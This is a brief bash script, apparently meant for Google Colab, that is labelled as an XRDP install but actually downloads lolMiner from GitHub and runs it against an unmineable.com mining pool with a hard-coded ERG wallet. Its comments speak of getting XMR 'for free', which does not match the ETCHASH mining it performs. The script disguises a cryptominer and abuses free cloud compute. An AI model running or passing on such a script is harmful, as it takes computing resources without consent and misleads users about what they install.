#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R lolMiner
 
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.57/lolminer-1.57.SwitchHiveOS.tar.gz
tar xvzf lolminer-1.57.SwitchHiveOS.tar.gz
cd lolminer
./lolMiner --algo ETCHASH --ethstratum ETHPROXY --pool stratum+tcp://etchash-eu.unmineable.com:3333 --user ERG:9iK7SExu5uqnfeXozX4zR9PvYrip3LYtpUvceqREfGXX4epYNHT.unmineable_worker_qfituw  
